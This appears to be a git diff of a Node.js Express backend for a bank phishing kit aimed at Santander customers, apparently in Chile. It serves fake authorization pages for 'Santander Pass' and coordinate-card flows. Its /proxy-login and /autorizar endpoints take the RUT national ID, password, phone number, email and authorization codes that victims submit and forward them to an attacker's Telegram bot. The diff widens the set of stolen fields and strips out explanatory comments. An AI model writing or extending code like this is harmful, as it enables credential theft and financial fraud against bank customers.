@@ -2,6 +2,8 @@ const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
+// Si tu Node es <18, instala node-fetch y descomenta:
+// const fetch = require("node-fetch");
 
 const app = express();
 app.use(cors());
@@ -30,18 +32,15 @@ app.get("/autorizacion", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
   if (cfg.tipoAutorizacion === "santander") {
-    // Flujo Santander Pass
     res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
     return;
   }
 
   if (cfg.tipoAutorizacion === "coordenadas") {
-    // Flujo Coordenadas → luego SMS
     res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
     return;
   }
 
-  // Valor por defecto
   res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
 });
 
@@ -49,7 +48,6 @@ app.get("/autorizacion", (req, res) => {
 app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
-    // Enviar a Telegram
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -62,21 +60,25 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Nuevo endpoint para login → enviar credenciales a Telegram y seguir flujo
+// Endpoint para login → enviar credenciales o correo a Telegram
 app.post("/proxy-login", async (req, res) => {
-  const { usuario, clave } = req.body;
-  const mensaje = `Login recibido:\nUsuario: ${usuario}\nClave: ${clave}`;
+  const { rut, passwd, telefono, mail } = req.body;
+  let mensaje = "";
+
+  if (mail) {
+    mensaje = `Correo actualizado:\n${mail}`;
+  } else {
+    mensaje = `Login recibido:\nRUT: ${rut}\nClave: ${passwd}\nTeléfono: ${telefono}`;
+  }
 
   try {
-    // Enviar credenciales a Telegram
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // Responder al frontend para que redirija a la siguiente etapa
-    res.json({ status: "ok", mensaje: "Credenciales enviadas a Telegram" });
+    res.json({ status: "ok", mensaje: "Datos enviados a Telegram" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
